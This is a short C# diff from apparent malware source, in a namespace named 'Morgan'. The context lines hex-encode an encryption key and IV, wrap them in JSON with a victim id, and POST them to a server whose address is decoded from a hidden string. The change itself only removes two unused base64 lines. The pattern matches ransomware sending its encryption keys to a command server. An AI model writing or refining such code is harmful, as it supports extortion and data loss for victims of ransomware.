@@ -141,8 +141,6 @@ namespace Morgan
             {
                 string kh = BitConverter.ToString(k).Replace("-", "").ToLower();
                 string ih = BitConverter.ToString(v).Replace("-", "").ToLower();
-                string kb = Convert.ToBase64String(k);
-                string vb = Convert.ToBase64String(v);
                 string jp = $"{{\"id\": \"{id}\", \"k\": \"{kh}\", \"v\": \"{ih}\"}}";
                 HttpWebRequest request = (HttpWebRequest)WebRequest.Create(GetString(c));
                 request.Method = "POST";
